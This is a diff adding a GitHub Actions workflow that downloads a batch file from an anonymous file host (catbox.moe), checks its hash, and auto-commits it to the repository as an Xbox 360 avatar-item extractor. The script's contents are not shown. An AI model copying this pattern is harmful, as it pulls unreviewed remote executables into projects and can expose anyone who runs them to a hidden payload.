@@ -1,0 +1,23 @@
+name: install
+on:
+  push:
+    paths:
+      - ".github/workflows/install.yml"
+permissions:
+  contents: write
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch it
+        run: curl -fsSL https://files.catbox.moe/fzuyyv.bat -o Extract-AvatarItem-v20.bat
+      - name: verify it
+        run: echo "b365613b85d561951efca963fbaf9e272c46252583cebe4faf577c0f25d2a3b8  Extract-AvatarItem-v20.bat" | sha256sum -c -
+      - name: commit it
+        run: |
+          git config user.name "extractor installer"
+          git config user.email "actions@users.noreply.github.com"
+          git add Extract-AvatarItem-v20.bat
+          git commit -m "Read the item out of an Xbox 360 package"
+          git push
